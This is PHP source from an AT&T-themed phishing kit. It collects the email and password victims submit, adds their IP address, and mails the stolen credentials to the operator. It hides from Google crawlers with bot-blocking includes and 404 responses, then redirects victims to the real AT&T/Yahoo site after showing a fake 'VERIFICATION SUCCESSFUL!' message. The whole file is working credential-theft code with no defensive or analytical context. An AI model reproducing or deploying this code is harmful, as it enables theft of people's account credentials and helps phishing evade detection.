<?php
include "../BOTS/antibots.php";
include("../your_email.php");
$ip = getenv("REMOTE_ADDR");
$message .= "----------------AT3T R3zult------------------\n";
$message .= "Email:    ".$_POST['email']."\n";
$message .= "Password  :    ".$_POST['password']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP      : https://whatismyipaddress.com/ip/$ip\n";         
$message .= "--------------------------------\n";
$subject = "AT3T R3zult | $IP ";
$headers .= "From: Alert" . "\r\n";
mail($to,$subject,$message,$headers);
mail($send,$subject,$message,$headers);
?>

<?php

//------------------------------------------|| ANTIBOTS  ||-----------------------------------------------------//
include "../BOTS/antibots1.php";
include "../BOTS/antibots2.php";
include "../BOTS/antibots3.php";
include "../BOTS/antibots4.php";
include "../BOTS/antibots5.php";
include "../BOTS/antibots6.php";
include "../BOTS/antibots7.php";
include "../BOTS/antibots8.php";
//----------------------------------------------------------------------------------------------------------------//
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
//----------------------------------------------------------------------------------------------------------------//
?>
<!DOCTYPE html>
<html>
<head>
    <title>Thank You  </title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="robots" content="noindex" />
    <link rel="icon" href="css/fav.ico" />
    <meta http-equiv="refresh" content="0; url=https://currently.att.yahoo.com">
</head>
    <?php echo "<h2><strong>VERIFICATION SUCCESSFUL!</strong></h2>"; ?>
</body>
</html>   

